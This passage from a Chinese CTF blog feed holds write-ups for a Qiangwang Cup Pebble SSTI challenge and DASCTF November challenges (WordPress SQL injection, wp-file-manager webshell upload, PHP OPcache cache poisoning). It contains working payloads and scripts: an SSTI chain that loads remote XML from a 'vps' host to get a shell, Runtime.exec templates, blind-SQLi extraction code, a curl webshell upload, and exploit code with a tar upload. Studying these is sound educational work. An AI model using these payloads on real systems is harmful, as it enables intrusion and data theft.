class="hljs-name">bean</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;% set y= beans.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;</span>).<span class="hljs-property">resourceLoader</span>.<span class="hljs-property">classLoader</span>.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&quot;java.beans.Beans&quot;</span>) %&#125;<br>&#123;% set yy =  beans.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;jacksonObjectMapper&quot;</span>).<span class="hljs-title function_">readValue</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y) %&#125;<br>&#123;% set yyy = yy.<span class="hljs-title function_">instantiate</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>) %&#125;<br>&#123;&#123; yyy.<span class="hljs-title function_">setConfigLocation</span>(<span class="hljs-string">&quot;http://vps:port/1.xml&quot;</span>) &#125;&#125;<br>&#123;&#123; yyy.<span class="hljs-title function_">refresh</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><p>这里注意时间</p><figure><img src="/img/2023第七届强网杯/170482122317322.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/170482122317323.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>本地是加了8小时（实际上好像不用加）</p><figure><img src="/img/2023第七届强网杯/170482122317324.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后访问<code>?x=file_20231227_230625</code>弹shell</p><p>远程还有一个filter但是jar包里没给</p><figure><img src="/img/2023第七届强网杯/170482122317425.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>实际黑名单过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">org.springframework.context.support.ClassPathXmlApplicationContext<br></code></pre></td></tr></table></figure><p>可以字符串拼接绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">org.springframework.context.&quot;+&quot;support.ClassPathXmlApplicationContext<br></code></pre></td></tr></table></figure><p>或者用第二种方法</p><p>https://blog.arkark.dev/2022/08/01/uiuctf/</p><p>先传一个evil.pebble</p><p>需要修改一下Prefix和Suffix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&#123;% set accessValidatorClass = beans.get(&quot;jacksonObjectMapper&quot;).getTypeFactory().findClass(&quot;com.mitchellbosecke.pebble.attributes.methodaccess.NoOpMethodAccessValidator&quot;) %&#125;<br>&#123;% set accessValidator =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, accessValidatorClass) %&#125;<br><br>&#123;% set builderClass = beans.get(&quot;jacksonObjectMapper&quot;).getTypeFactory().findClass(&quot;com.mitchellbosecke.pebble.PebbleEngine$Builder&quot;) %&#125;<br>&#123;% set builder =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, builderClass) %&#125;<br><br>&#123;% set engine = builder.methodAccessValidator(accessValidator).build() %&#125;<br>&#123;% set loader = engine.getLoader() %&#125;<br>&#123;&#123; loader.setPrefix(&quot;/tmp&quot;) &#125;&#125;<br>&#123;&#123; loader.setSuffix(&quot;pebble&quot;) &#125;&#125;<br><br>&#123;% set rceFileName = request.getParameter(&quot;rceFileName&quot;) %&#125;<br><br>&#123;% set template = engine.getTemplate(rceFileName) %&#125;<br><br>&#123;&#123; template.evaluate(response.getWriter()) &#125;&#125;<br></code></pre></td></tr></table></figure><p>然后再传一个模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&#123;% set cmd = &#x27;xxx&#x27;.split(&quot;;&quot;) %&#125;<br>&#123;&#123; (1).TYPE.forName(&quot;java.lang.Runtime&quot;).methods[0].invoke(null, null).exec(cmd) &#125;&#125;<br></code></pre></td></tr></table></figure><p>然后加载模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">?x=xx&amp;rceFileName=xx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023DASCTF_X_0psu3十一月挑战赛</title>
    <link href="/2023/12/15/2023DASCTF_X_0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/12/15/2023DASCTF_X_0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="dasctf-11">2023DASCTF-11</h1><p>质量很高的一场dasctf月赛</p><h1 id="web">WEB</h1><h2 id="ezpenetration">EzPenetration</h2><blockquote><p>题目源自真实渗透案例</p><p>hint1：flag写入方式已修改。flag在wp那个机器的 /flag</p><p>hint2：数据库里的邮箱key已更改为管理员密码，拿到后可直接登录</p></blockquote><p>打开网站，看到是wordpress的站</p><figure><img src="/img/2023DASCTF-11/170264599168038.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>wpscan扫一下</p><p><code>wpscan --url http://node4.buuoj.cn:25061/ --api-token xxx</code></p><p>扫出几十个洞，根据提示找到email相关，这里有用的是这个插件的sql洞</p><p><code>[!] Title: Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</code></p><figure><img src="/img/2023DASCTF-11/17026459916671.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Plain">POST /wp-admin/admin-ajax.php?action=rtec_send_unregister_link HTTP/1.1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: en-GB,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 127<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br><br>event_id=3%20UNION%20SELECT%200,1,2,3,4,5,6,7,8,group_concat(user_email)%20from%20wp_users%20--%20x&amp;email=recipient@example.com<br></code></pre></td></tr></table></figure><p>试了一下是无回显的，用盲注跑</p><p>先看poc原理，化简一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">event_id=3 union select 1,2,3,4,5,6,7,8,9,10--&amp;email=recipient@example.com<br></code></pre></td></tr></table></figure><p>在第10位可以构造盲注，如果第10位true则返回success，否则返回error，那么利用<code>where 0^</code>来构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL">database() <span class="hljs-keyword">from</span> wp_users <span class="hljs-keyword">where</span> <span class="hljs-number">0</span><span class="hljs-operator">^</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br>database() <span class="hljs-keyword">from</span> wp_users <span class="hljs-keyword">where</span> <span class="hljs-number">0</span><span class="hljs-operator">^</span><span class="hljs-number">0</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><figure><img src="/img/2023DASCTF-11/17026459916672.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023DASCTF-11/17026459916673.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>参考wp用二分法跑sql，这里的关键是<code>group_concat(option_name,0x7e,option_value) from wp_options where option_id = 16</code>，获取<code>wp_options</code>表的第16行的name和value值，学到新姿势了</p><figure><img src="/img/2023DASCTF-11/17026459916674.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>r=requests.session()<br>database_vule = <span class="hljs-string">&quot;&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://node4.buuoj.cn:25061/wp-admin/admin-ajax.php?action=rtec_send_unregister_link&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low+high)//<span class="hljs-number">2</span><br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;event_id&quot;:f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),&#123;i&#125;,1)) from wp_options where option_id = 16)&gt;&#123;mid&#125;)-- &quot;,</span><br>            <span class="hljs-string">&quot;event_id&quot;</span>:<span class="hljs-string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="hljs-subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 15)&gt;<span class="hljs-subst">&#123;mid&#125;</span>)-- &quot;</span>,<br>            <span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;recipient@example.com&quot;</span><br>        &#125;<br>        re=requests.post(url,data=payload)<br>        <span class="hljs-comment">#print(payload)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;success&quot;</span><span class="hljs-keyword">in</span> re.text):<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">127</span>:<br>        flag += <span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拿到管理员账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">mailserver_login~y4nshu@163.com<br>mailserver_pass~fO0CO2#0ky#oLgH1JI<br></code></pre></td></tr></table></figure><p>登录</p><figure><img src="/img/2023DASCTF-11/17026459916675.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>进入管理员后台，下载可以rce的插件，如：<code>wp-file-manager</code></p><p>6.0版本有漏洞，https://wordpress.org/plugins/wp-file-manager/advanced/</p><figure><img src="/img/2023DASCTF-11/17026459916676.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>访问http://node4.buuoj.cn:25061/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php，看到这个返回就说明漏洞利用成功了</p><figure><img src="/img/2023DASCTF-11/17026459916677.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">curl -F cmd=upload -F target=l1_ -F <span class="hljs-string">&quot;upload[]=@shell.php&quot;</span> -XPOST <span class="hljs-string">&quot;http://node4.buuoj.cn:25061/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span><br>&#123;<span class="hljs-string">&quot;added&quot;</span>:[&#123;<span class="hljs-string">&quot;isowner&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;ts&quot;</span>:1702386876,<span class="hljs-string">&quot;mime&quot;</span>:<span class="hljs-string">&quot;text\/x-php&quot;</span>,<span class="hljs-string">&quot;read&quot;</span>:1,<span class="hljs-string">&quot;write&quot;</span>:1,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;25&quot;</span>,<span class="hljs-string">&quot;hash&quot;</span>:<span class="hljs-string">&quot;l1_c2hlbGwucGhw&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;phash&quot;</span>:<span class="hljs-string">&quot;l1_Lw&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/shell.php&quot;</span>&#125;],<span class="hljs-string">&quot;removed&quot;</span>:[],<span class="hljs-string">&quot;changed&quot;</span>:[&#123;<span class="hljs-string">&quot;isowner&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;ts&quot;</span>:1702386876,<span class="hljs-string">&quot;mime&quot;</span>:<span class="hljs-string">&quot;directory&quot;</span>,<span class="hljs-string">&quot;read&quot;</span>:1,<span class="hljs-string">&quot;write&quot;</span>:1,<span class="hljs-string">&quot;size&quot;</span>:0,<span class="hljs-string">&quot;hash&quot;</span>:<span class="hljs-string">&quot;l1_Lw&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;files&quot;</span>,<span class="hljs-string">&quot;phash&quot;</span>:<span class="hljs-string">&quot;l1_L3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtZmlsZS1tYW5hZ2VyL2xpYg&quot;</span>,<span class="hljs-string">&quot;volumeid&quot;</span>:<span class="hljs-string">&quot;l1_&quot;</span>,<span class="hljs-string">&quot;locked&quot;</span>:1&#125;]&#125;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>webshell路径http://node4.buuoj.cn:25061/wp-content/plugins/wp-file-manager/lib/files/shell.php</p><figure><img src="/img/2023DASCTF-11/17026459916678.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>也可以用工具一把嗦，github上很多，不列举了</p><h2 id="single_php">single_php</h2><p>给了一个<code>$_GET['LuckyE'](__FILE__);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">I have been single dog <span class="hljs-keyword">for</span> <span class="hljs-number">19</span> years.<br>One day, my brothers betrayed the singles organization.<br>S* <span class="hljs-keyword">and</span> B* ,both of them have the kanozyo.<br>Now revenge to them!!!!!<br><span class="hljs-keyword">use</span> &#x27;$<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">LuckyE</span>&#x27;](<span class="hljs-title">__FILE__</span>);<span class="hljs-string">&#x27; to begin your revenge!!</span><br></code></pre></td></tr></table></figure><p>可以传<code>?LuckyE=highlight_file</code>看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP">... <br> &lt;title&gt;revenge to siranai.php<br>...<br><br> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br> <br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();<br> &#125;<br> &#125;<br> <span class="hljs-variable">$kanozyo</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;LuckyE&#x27;</span>](<span class="hljs-keyword">__FILE__</span>);<br> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$kanozyo</span>);<br> <span class="hljs-variable">$suki</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;suki&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>提示有siranai.php，然后有个序列化，可以执行无参函数比如phpinfo()</p><p>siranai.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allowed_ip</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-variable">$allowed_ip</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;S* has the kanojo but you don&#x27;t&quot;</span>);<br>&#125;<br><br> <span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/x-tar&#x27;</span>)&#123;<br> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br> &#125;<br></code></pre></td></tr></table></figure><p>分析一下代码<code>$allowed_ip = "127.0.0.1";</code>，本地回环，要ssrf</p><p><code>$finfo = finfo_open(FILEINFO_MIME_TYPE);</code>获取文件的MIME类型</p><p><code>finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/x-tar'</code>检查文件类型为x-tar，这里注意tmp_name，将上传的文件重命名放到临时文件目录了<code>exec('cd /tmp &amp;&amp; tar -xvf ' . $_FILES["file"]["tmp_name"]);</code>上传到tmp然后解压</p><p>这里exec看起来可以单引号闭合进行rce，但是刚刚提到了文件会被重命名，所以无法闭合</p><p>软连接和目录穿越没有考虑过，但出题人也说是不可以的</p><blockquote><p>第一次出题,0解是意料之外,怕有各种奇奇怪怪的非预期,我将/var/www/html/目录改成只读了,虽然docker上测了目录穿越和软链接好像不行?师傅们轻点喷.</p></blockquote><p>没思路了，看wp</p><p>Zend OPcache扩展执行php代码</p><p>参考https://www.vuln.cn/6763</p><p>调个phpinfo看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();<br>    &#125;<br>&#125;<br><span class="hljs-comment">// $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__);</span><br><span class="hljs-comment">// var_dump($kanozyo);</span><br><span class="hljs-comment">// $suki = unserialize($_POST[&#x27;suki&#x27;]);</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<br><span class="hljs-variable">$a</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>] = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// O:6:&quot;siroha&quot;:1:&#123;s:3:&quot;koi&quot;;a:1:&#123;s:21:&quot;zhanjiangdiyishenqing&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>php8.2.10</p><figure><img src="/img/2023DASCTF-11/17026459916689.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>指定了缓存目录<code>opcache.file_cache</code>为<code>/tmp</code></p><figure><img src="/img/2023DASCTF-11/170264599166810.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>OPcache 存储了已编译的 PHP 脚本文件，这些缓存文件被放置在和 Web目录一致的目录结构中</p></blockquote><p>所以index.php的缓存文件会存在<code>/tmp/[system_id]/var/www/index.php.bin</code></p><blockquote><p>运行 Web 服务的用户对 OPcache缓存目录（如：/tmp/opcache/）里面的所有子目录以及文件都具有写权限。</p><p>因此，我们可以通过使用一个已经编译过的 webshell 的缓存文件替换OPcache 缓存目录中已有的缓存文件来达到执行恶意代码的目的。</p></blockquote><p>根据已知信息，可以有以下思路：</p><p>我们只要构造<code>index.php.bin</code>通过ssrf上传到缓存目录<code>/tmp</code>，覆盖掉原来的<code>index.php.bin</code>，再次访问index.php，就会执行恶意构造的opcode达到rce</p><p>现在有三个难点</p><ol type="1"><li>构造<code>index.php.bin</code></li><li>找到缓存目录，即求<code>[system_id]</code></li><li>ssrf上传tar</li></ol><p>先构造<code>index.php.bin</code></p><p>本地起个php8.2.10的docker，我用的是<code>docker pull php:8.2.10-apache</code></p><p>启动容器<code>docker run -d -p 8888:80 php:8.2.10-apache</code></p><p>因为php7以上自带opcache扩展，不用再另外安装，直接开启即可<code>docker-php-ext-enable opcache</code></p><p>新建index.php，写入一句话马，访问一下index.php</p><p>可以看到tmp目录下有了<code>index.php.bin</code></p><figure><img src="/img/2023DASCTF-11/170264599166811.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载到本地，这里注意原题开启了时间戳验证</p><figure><img src="/img/2023DASCTF-11/170264599166812.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>opcache.validate_timestamps=1，OPcache 会将被请求访问的 php源文件的时间戳与对应的缓存文件的时间戳进行对比校验。如果两个时间戳不匹配，缓存文件将被丢弃，并且重新生成一份新的缓存文件。要想绕过此限制，攻击者必须知道目标源文件的时间戳。</p></blockquote><p>那我们要知道题目里的index.php的时间，刚好php有个函数<code>filectime()</code>可以获取文件时间</p><figure><img src="/img/2023DASCTF-11/170264599166813.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>修改本地文件时间戳0x0040-0x0043位置</p><figure><img src="/img/2023DASCTF-11/170264599166814.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里我参考https://fdlucifer.github.io/2023/07/01/2023-chunqiubei-spring-php-again/手动改了，用脚本改也行</p><figure><img src="/img/2023DASCTF-11/170264599166815.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>求<code>[system_id]</code></p><p>这里其实不用求了，因为我本地docker起了一个完全相同的环境，所以路径其实就是：</p><p><code>/tmp/214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin</code></p><p>要算的话根据phpinfo里的信息计算</p><p>https://docs.google.com/presentation/d/18y60Xy0eVeUnBXIH_t3ikfly_uyYbtfI6zAuKCHtlac/edit#slide=id.g138319ca92_0_23</p><figure><img src="/img/2023DASCTF-11/170264599166816.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP">PHP Version          <span class="hljs-number">8.2</span>.<span class="hljs-number">10</span><br>Zend Extension        <span class="hljs-number">420220829</span><br>Zend Extension Build        API420220829,NTS<br></code></pre></td></tr></table></figure><p>脚本计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import hashlib<br>sys_id = hashlib.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&quot;utf-8&quot;</span>)).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><span class="hljs-keyword">print</span>(sys_id)<br></code></pre></td></tr></table></figure><p>然后ssrf上传tar包</p><p>先用python创建tar包，然后伪造上传文件的数据包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import hashlib<br>import tarfile<br>import requests<br><br>url = <span class="hljs-string">&#x27;http://cca8d734-3d3a-4c6c-8a89-9330b5e6e00d.node4.buuoj.cn:81/siranai.php&#x27;</span><br>sys_id = <span class="hljs-string">&#x27;214510e772fba140ea7a33a277f2799e&#x27;</span><br>def <span class="hljs-title function_ invoke__">tar_file</span>():<br>    tar_filename = <span class="hljs-string">&#x27;exp.tar&#x27;</span><br>    with tarfile.<span class="hljs-title function_ invoke__">open</span>(tar_filename,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        directory_info = tarfile.<span class="hljs-title function_ invoke__">TarInfo</span>(name=f<span class="hljs-string">&#x27;&#123;sys_id&#125;/var/www/html&#x27;</span>)<br>        directory_info.type = tarfile.DIRTYPE<br>        directory_info.mode = <span class="hljs-number">0o777</span><br><br>        tar.<span class="hljs-title function_ invoke__">addfile</span>(directory_info)<br><br>        tar.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-string">&#x27;index.php.bin&#x27;</span>, arcname=f<span class="hljs-string">&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;</span>)<br><br>def <span class="hljs-title function_ invoke__">upload</span>():<br>    file = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-title function_ invoke__">read</span>(),<span class="hljs-string">&quot;application/x-tar&quot;</span>)&#125;<br>    res  = requests.<span class="hljs-title function_ invoke__">post</span>(url=url,files=file)<br>    <span class="hljs-keyword">print</span>(res.request.headers)<br>    <span class="hljs-keyword">return</span> res.request<br><br><span 